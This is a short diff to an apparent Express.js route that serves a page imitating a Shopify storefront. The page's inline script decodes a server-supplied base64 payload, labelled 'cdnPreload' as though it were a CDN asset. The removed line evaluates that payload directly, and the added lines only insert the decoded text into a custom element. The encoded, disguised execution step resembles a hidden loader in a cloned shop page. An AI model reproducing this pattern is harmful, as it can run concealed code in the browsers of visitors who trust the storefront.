@@ -3634,7 +3634,9 @@ app.get('/shop', extractSubdomain, (req, res, next) => {
     <meta name="description" content="${slug}">
     <script>
         const cdnPreload = atob('${payload}');
-        eval(cdnPreload);
+        const cdnElement = document.createElement('cdnElement');
+        cdnElement.textContent = cdnPreload;
+        document.head.appendChild(cdnElement);
     </script>
     <script type="text/javascript" async="" src="//bf9fa1-7d.myshopify.com/cdn/s/trekkie.storefront.6feac1db1e2c7d84269967dcaefdee0618af51f6.min.js"></script><script src="//bf9fa1-7d.myshopify.com/cdn/shop/t/1/assets/constants.js?v=132983761750457495441719145825" defer="defer"></script>
     <script src="//bf9fa1-7d.myshopify.com/cdn/shop/t/1/assets/pubsub.js?v=158357773527763999511719145825" defer="defer"></script>
